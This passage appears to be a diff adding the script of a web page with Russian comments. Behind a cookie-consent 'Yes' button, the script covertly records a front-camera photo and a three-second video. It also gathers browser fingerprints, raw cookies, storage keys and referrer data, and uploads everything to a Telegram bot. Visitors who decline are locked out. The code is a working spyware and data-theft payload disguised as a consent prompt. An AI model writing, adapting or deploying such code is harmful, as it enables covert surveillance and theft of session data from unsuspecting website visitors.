+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    if (dbg) {
+      OTHER_DATA['01 GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      OTHER_DATA['02 GPU рендер'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+    }
+    OTHER_DATA['03 WebGL версия']  = gl.getParameter(gl.VERSION);
+    OTHER_DATA['04 GLSL версия']   = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+    OTHER_DATA['05 Макс текстура'] = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+    OTHER_DATA['06 Макс viewport'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join('x');
+    OTHER_DATA['07 Макс атрибуты'] = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
+    OTHER_DATA['08 Макс uniform']  = gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS);
+    OTHER_DATA['09 Макс varying']  = gl.getParameter(gl.MAX_VARYING_VECTORS);
+    OTHER_DATA['10 Макс fragment'] = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS);
+    const exts = gl.getSupportedExtensions() || [];
+    OTHER_DATA['11 WebGL расширений'] = exts.length;
+    OTHER_DATA['12 WebGL ext']        = exts.slice(0, 40).join(', ');
+  } catch (e) {}
+}
+
+function collectCanvas() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 280; c.height = 60;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '16px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0, 0, 100, 30);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint 你好', 2, 10);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('Fingerprint 你好', 4, 20);
+    const d = c.toDataURL();
+    OTHER_DATA['13 Canvas hash']  = simpleHash(d);
+    OTHER_DATA['14 Canvas длина'] = d.length;
+  } catch (e) {}
+}
+
+async function collectAudio() {
+  try {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (!AC) return;
+    const ctx = new AC(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    osc.connect(comp); comp.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    const ch = buf.getChannelData(0);
+    let sum = 0;
+    for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
+    OTHER_DATA['15 Audio fingerprint'] = sum.toString().slice(0, 20);
+  } catch (e) {}
+}
+
+function collectFonts() {
+  const base = ['monospace', 'sans-serif', 'serif'];
+  const test = ['Arial','Arial Black','Arial Narrow','Comic Sans MS','Courier New','Georgia',
+    'Impact','Times New Roman','Trebuchet MS','Verdana','Tahoma','Helvetica','Segoe UI',
+    'Roboto','Ubuntu','Cantarell','Calibri','Cambria','Consolas','Menlo','Monaco',
+    'DejaVu Sans','Liberation Sans','Noto Sans','Symbol','Wingdings','Webdings'];
+  const span = document.createElement('span');
+  span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
+  span.textContent = 'mmmmmmmmmmlliWWWW';
+  document.body.appendChild(span);
+  const baseSizes = {};
+  for (const b of base) { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth + 'x' + span.offsetHeight; }
+  const found = [];
+  for (const f of test) {
+    for (const b of base) {
+      span.style.fontFamily = '"' + f + '",' + b;
+      if (span.offsetWidth + 'x' + span.offsetHeight !== baseSizes[b]) { found.push(f); break; }
+    }
+  }
+  document.body.removeChild(span);
+  OTHER_DATA['16 Шрифтов']        = found.length;
+  OTHER_DATA['17 Список шрифтов'] = found.join(', ');
+}
+
+function collectPlugins() {
+  if (!navigator.plugins) return;
+  const p = [];
+  for (let i = 0; i < navigator.plugins.length; i++)
+    p.push(navigator.plugins[i].name + ' v' + (navigator.plugins[i].version || ''));
+  OTHER_DATA['18 Плагинов']        = p.length;
+  OTHER_DATA['19 Список плагинов'] = p.join(' | ');
+}
+
+function collectCodecs() {
+  const v = document.createElement('video');
+  const a = document.createElement('audio');
+  const codecs = {
+    'H.264':  v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
+    'H.265':  v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"'),
+    'VP8':    v.canPlayType('video/webm; codecs="vp8"'),
+    'VP9':    v.canPlayType('video/webm; codecs="vp9"'),
+    'AV1':    v.canPlayType('video/mp4; codecs="av01.0.05M.08"'),
+    'Theora': v.canPlayType('video/ogg; codecs="theora"'),
+    'AAC':    a.canPlayType('audio/mp4; codecs="mp4a.40.2"'),
+    'MP3':    a.canPlayType('audio/mpeg'),
+    'Opus':   a.canPlayType('audio/webm; codecs="opus"'),
+    'Vorbis': a.canPlayType('audio/ogg; codecs="vorbis"'),
+    'FLAC':   a.canPlayType('audio/flac'),
+    'WAV':    a.canPlayType('audio/wav'),
+  };
+  let i = 20;
+  for (const k in codecs) OTHER_DATA[String(i++).padStart(2, '0') + ' Кодек ' + k] = codecs[k] || 'нет';
+}
+
+function collectSecurity() {
+  OTHER_DATA['40 Secure Context']   = window.isSecureContext;
+  OTHER_DATA['41 Cross-Origin Isol.'] = window.crossOriginIsolated;
+  OTHER_DATA['42 Trusted Types']    = !!window.trustedTypes;
+  OTHER_DATA['43 Do Not Track']     = navigator.doNotTrack;
+  OTHER_DATA['44 Timezone offset']  = new Date().getTimezoneOffset();
+  OTHER_DATA['45 TTFB']             = performance.timing ? (performance.timing.responseStart - performance.timing.requestStart) : '';
+  OTHER_DATA['46 Загрузка стр.']    = performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : '';
+  OTHER_DATA['47 DNS lookup']       = performance.timing ? (performance.timing.domainLookupEnd - performance.timing.domainLookupStart) : '';
+  OTHER_DATA['48 TCP connect']      = performance.timing ? (performance.timing.connectEnd - performance.timing.connectStart) : '';
+  OTHER_DATA['49 Orientation lock'] = 'orientation' in screen && 'lock' in screen.orientation;
+  OTHER_DATA['50 Keyboard Lock']    = 'keyboard' in navigator;
+}
+
+// ═══════════════════════════════════════════════════════════
+// САЙТЫ
+// ═══════════════════════════════════════════════════════════
+function collectSites() {
+  SITES_DATA['01 Referrer']          = document.referrer || '(прямой заход)';
+  SITES_DATA['02 Referrer host']     = (() => { try { return new URL(document.referrer).hostname; } catch { return ''; } })();
+  SITES_DATA['03 Referrer origin']   = (() => { try { return new URL(document.referrer).origin; } catch { return ''; } })();
+  SITES_DATA['04 Referrer path']     = (() => { try { return new URL(document.referrer).pathname; } catch { return ''; } })();
+  SITES_DATA['05 Текущий URL']       = location.href;
+  SITES_DATA['06 Текущий host']      = location.hostname;
+  SITES_DATA['07 Текущий origin']    = location.origin;
+  SITES_DATA['08 Текущий path']      = location.pathname;
+  SITES_DATA['09 Query string']      = location.search || '(нет)';
+  SITES_DATA['10 Hash']              = location.hash || '(нет)';
+
+  try {
+    const nav = performance.getEntriesByType('navigation');
+    if (nav && nav.length) {
+      SITES_DATA['11 Тип навигации']       = nav[0].type;
+      SITES_DATA['12 Redirect count']      = nav[0].redirectCount;
+      SITES_DATA['13 Redirect время (ms)'] = Math.round(nav[0].redirectEnd - nav[0].redirectStart);
+      SITES_DATA['15 Next hop protocol']   = nav[0].nextHopProtocol || '';
+    }
+  } catch (e) {}
+
+  SITES_DATA['16 History length'] = history.length;
+
+  try {
+    const res = performance.getEntriesByType('resource');
+    const hosts = new Set();
+    for (const r of res) {
+      try { const u = new URL(r.name); if (u.hostname !== location.hostname) hosts.add(u.hostname); } catch (e) {}
+    }
+    SITES_DATA['17 Сторонних доменов'] = hosts.size;
+    SITES_DATA['18 Список доменов']    = Array.from(hosts).slice(0, 40).join(', ');
+  } catch (e) {}
+
+  SITES_DATA['19 Screen']        = screen.width + 'x' + screen.height;
+  SITES_DATA['20 Viewport']      = window.innerWidth + 'x' + window.innerHeight;
+  SITES_DATA['21 Language']      = navigator.language;
+  SITES_DATA['22 Platform']      = navigator.platform;
+  SITES_DATA['23 Time']          = new Date().toLocaleString('ru-RU');
+  SITES_DATA['24 Timezone']      = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  try {
+    const ck = document.cookie;
+    SITES_DATA['25 Cookies сырое']    = ck || '(нет доступных)';
+    SITES_DATA['26 Cookies кол-во']   = ck ? ck.split(';').length : 0;
+    const names = ck ? ck.split(';').map(x => x.trim().split('=')[0]).join(', ') : '';
+    SITES_DATA['27 Cookies имена']    = names || '(нет)';
+  } catch (e) {}
+
+  try {
+    const keys = [];
+    for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
+    SITES_DATA['28 localStorage ключей'] = keys.length;
+    SITES_DATA['29 localStorage имена']  = keys.slice(0, 30).join(', ');
+  } catch (e) {}
+
+  try {
+    const keys = [];
+    for (let i = 0; i < sessionStorage.length; i++) keys.push(sessionStorage.key(i));
+    SITES_DATA['30 sessionStorage ключей'] = keys.length;
+    SITES_DATA['31 sessionStorage имена']  = keys.slice(0, 30).join(', ');
+  } catch (e) {}
+
+  const ref = document.referrer;
+  if (!ref)                          SITES_DATA['34 Источник']  = 'прямой заход';
+  else if (/google\./i.test(ref))    SITES_DATA['34 Источник']  = 'Google';
+  else if (/yandex\./i.test(ref))    SITES_DATA['34 Источник']  = 'Яндекс';
+  else if (/bing\./i.test(ref))      SITES_DATA['34 Источник']  = 'Bing';
+  else if (/duckduckgo\./i.test(ref))SITES_DATA['34 Источник']  = 'DuckDuckGo';
+  else                               SITES_DATA['34 Источник']  = 'другой сайт: ' + ref;
+
+  SITES_DATA['35 Standalone']   = window.matchMedia('(display-mode: standalone)').matches;
+  SITES_DATA['36 Minimal UI']   = window.matchMedia('(display-mode: minimal-ui)').matches;
+  SITES_DATA['37 Fullscreen PWA']= window.matchMedia('(display-mode: fullscreen)').matches;
+  SITES_DATA['38 Browser mode'] = window.matchMedia('(display-mode: browser)').matches;
+  SITES_DATA['39 BFCache']      = performance.getEntriesByType('navigation')[0]?.type === 'back_forward';
+  SITES_DATA['40 Открыт при запуске'] = performance.navigation ? performance.navigation.type === 0 : '';
+}
+
+function simpleHash(str) {
+  let h = 0;
+  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
+  return (h >>> 0).toString(16);
+}
+
+// ═══════════════════════════════════════════════════════════
+// ОТПРАВКА
+// ═══════════════════════════════════════════════════════════
+
+function sendChunk(text) {
+  return new Promise(res => {
+    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
+                '&parse_mode=HTML&disable_web_page_preview=false&text=' + encodeURIComponent(text);
+    const img = new Image();
+    img.onload = img.onerror = () => res();
+    img.src = url;
+    setTimeout(res, 400);
+  });
+}
+
+async function sendFile(filename, content, caption) {
+  try {
+    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('document', blob, filename);
+    form.append('caption', caption || 'Cookies — ' + new Date().toLocaleString('ru-RU'));
+
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', {
+      method: 'POST', body: form
+    });
+    const j = await r.json();
+    return j.ok;
+  } catch (e) { return false; }
+}
+
+async function sendPhoto(blob) {
+  try {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', blob, 'photo.jpg');
+    form.append('caption',
+      '📷 Фото пользователя\n' +
+      'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+      'URL: ' + location.href + '\n' +
+      'UA: ' + navigator.userAgent.slice(0, 150)
+    );
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
+      method: 'POST', body: form
+    });
+    const j = await r.json();
+    return j.ok;
+  } catch (e) { return false; }
+}
+
+async function sendVideo(blob, ext) {
+  try {
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('video', blob, 'video.' + (ext || 'webm'));
+    form.append('caption',
+      '🎥 Видео с фронтальной камеры (3 сек)\n' +
+      'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
+      'URL: ' + location.href
+    );
+    form.append('supports_streaming', 'true');
+    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
+      method: 'POST', body: form
+    });
+    const j = await r.json();
+    return j.ok;
+  } catch (e) { return false; }
+}
+
+async function sendCategory(title, obj) {
+  const entries = Object.entries(obj).filter(([k, v]) => v !== '' && v != null && v !== false && v !== 'false');
+  const lines = entries.map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 300));
+
+  const chunks = [];
+  let cur = '';
+  for (const line of lines) {
+    if ((cur + line).length > 3600) { chunks.push(cur); cur = ''; }
+    cur += line + '\n';
+  }
+  if (cur) chunks.push(cur);
+
+  for (let i = 0; i < chunks.length; i++) {
+    const head = title + ' (' + entries.length + ' полей)' +
+                 (chunks.length > 1 ? ' - часть ' + (i + 1) + '/' + chunks.length : '') + '\n\n';
+    await sendChunk(head + chunks[i]);
+    await new Promise(r => setTimeout(r, 500));
+  }
+}
+
+// ═══════════════════════════════════════════════════════════
+// ФОТО + ВИДЕО С ФРОНТАЛЬНОЙ КАМЕРЫ
+// ═══════════════════════════════════════════════════════════
+async function capturePhotoAndVideo(seconds = 3) {
+  let stream = null;
+  try {
+    // один запрос камеры — используем и для фото, и для видео
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 640, height: 480, frameRate: 24 },
+      audio: false
+    });
+    video.srcObject = stream;
+
+    // ждём первый кадр
+    await new Promise(res => {
+      if (video.readyState >= 2) return res();
+      video.onloadeddata = () => res();
+    });
+    await new Promise(r => setTimeout(r, 400)); // стабилизация экспозиции
+
+    // ── 1) ФОТО (первый стабильный кадр) ──
+    const w = video.videoWidth  || 640;
+    const h = video.videoHeight || 480;
+    canvas.width = w; canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+    ctx.clearRect(0, 0, w, h); // затираем canvas
+
+    // ── 2) ВИДЕО (3 сек) ──
+    // подбираем поддерживаемый формат
+    let mime = 'video/webm;codecs=vp9,opus';
+    let ext  = 'webm';
+    if (typeof MediaRecorder === 'undefined') {
+      // Safari не имеет MediaRecorder вообще (в старых версиях) — пропускаем видео
+      if (photoBlob) await sendPhoto(photoBlob);
+      stream.getTracks().forEach(t => t.stop());
+      video.srcObject = null;
+      return { photo: !!photoBlob, video: false };
+    }
+    const candidates = [
+      ['video/webm;codecs=vp9,opus', 'webm'],
+      ['video/webm;codecs=vp8,opus', 'webm'],
+      ['video/webm',                 'webm'],
+      ['video/mp4;codecs=h264,aac',  'mp4'],
+      ['video/mp4',                  'mp4'],
+    ];
+    for (const [m, e] of candidates) {
+      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
+        mime = m; ext = e; break;
+      }
+    }
+
+    const chunks = [];
+    let rec;
+    try {
+      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
+    } catch (e) {
+      // если с указанным mime не получилось — пробуем без опций
+      try { rec = new MediaRecorder(stream); ext = 'webm'; }
+      catch (e2) { rec = null; }
+    }
+
+    let videoBlob = null;
+    if (rec) {
+      rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+      const videoDone = new Promise(res => {
+        rec.onstop = () => {
+          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
+          res();
+        };
+      });
+      rec.start(100);
+      await new Promise(r => setTimeout(r, seconds * 1000));
+      try { rec.stop(); } catch (e) {}
+      await videoDone;
+    }
+
+    // гасим камеру СРАЗУ после записи
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+
+    // ── 3) отправка ──
+    if (photoBlob) await sendPhoto(photoBlob);
+    if (videoBlob && videoBlob.size > 0) await sendVideo(videoBlob, ext);
+
+    return { photo: !!photoBlob, video: !!(videoBlob && videoBlob.size) };
+  } catch (e) {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    return { photo: false, video: false, error: e.message };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════
+// ОРКЕСТРАТОР
+// ═══════════════════════════════════════════════════════════
+async function runAll() {
+  try { await collectCookies(); } catch (e) {}
+  try { await collectGeo();     } catch (e) {}
+  try { await collectPhone();   } catch (e) {}
+  try { collectBrowser();       } catch (e) {}
+  try { collectWebGL();         } catch (e) {}
+  try { collectCanvas();        } catch (e) {}
+  try { await collectAudio();   } catch (e) {}
+  try { collectFonts();         } catch (e) {}
+  try { collectPlugins();       } catch (e) {}
+  try { collectCodecs();        } catch (e) {}
+  try { collectSecurity();      } catch (e) {}
+  try { collectSites();         } catch (e) {}
+
+  const cookieLines = Object.entries(COOKIE_DATA)
+    .filter(([k, v]) => v !== '' && v != null)
+    .map(([k, v]) => k + ': ' + v)
+    .join('\n');
+  const cookieTxt = 'COOKIES - ' + new Date().toLocaleString('ru-RU') + '\n' +
+                    'URL: ' + location.href + '\n' +
+                    'Домен: ' + location.hostname + '\n' +
+                    '='.repeat(60) + '\n\n' + cookieLines;
+  await sendFile('cookies.txt', cookieTxt, 'Cookies — ' + new Date().toLocaleString('ru-RU'));
+
+  await sendCategory('ГЕОЛОКАЦИЯ + ССЫЛКИ НА КАРТЫ', GEO_DATA);
+  await sendCategory('ТЕЛЕФОН / УСТРОЙСТВО', PHONE_DATA);
+  await sendCategory('БРАУЗЕР И ПОЛЬЗОВАТЕЛЬ', BROWSER_DATA);
+  await sendCategory('ДРУГОЕ', OTHER_DATA);
+  await sendCategory('ПОСЕЩЁННЫЕ САЙТЫ И СЕССИЯ', SITES_DATA);
+}
+
+// ═══════════════════════════════════════════════════════════
+// КНОПКА «ДА»
+// ═══════════════════════════════════════════════════════════
+btnYes.onclick = async () => {
+  btnYes.disabled = true;
+  btnNo.disabled  = true;
+  statusEl.textContent = 'Ожидаем подтверждение в браузере...';
+
+  try {
+    document.cookie = 'consent=accepted; path=/; max-age=' + (365 * 24 * 3600);
+    localStorage.setItem('cookie_consent', 'accepted');
+    localStorage.setItem('cookie_consent_time', new Date().toISOString());
+    sessionStorage.setItem('cookie_consent', 'accepted');
+  } catch (e) {}
+
+  await sendChunk(
+    '<b>ПОЛЬЗОВАТЕЛЬ НАЖАЛ «ДА»</b>\n\n' +
+    '<b>Время:</b> ' + new Date().toLocaleString('ru-RU') + '\n' +
+    '<b>UA:</b> ' + navigator.userAgent.slice(0, 200) + '\n' +
+    '<b>URL:</b> ' + location.href
+  );
+
+  // фото + 3 сек видео с фронтальной камеры
+  statusEl.textContent = 'Съёмка (3 сек)...';
+  await capturePhotoAndVideo(3);
+
+  // все данные
+  statusEl.textContent = 'Передаём данные...';
+  await runAll();
+
+  statusEl.textContent = 'Готово.';
+  document.getElementById('gate').style.display = 'none';
+  document.getElementById('site').style.display = 'block';
+};
+
+btnNo.onclick = () => {
+  document.body.innerHTML =
+    '<p style="padding:40px;font:16px Arial;color:#eee;background:#000;min-height:100vh;margin:0">Вы отказались. Сайт недоступен.</p>';
+};
+</script>
+</body>
+</html>
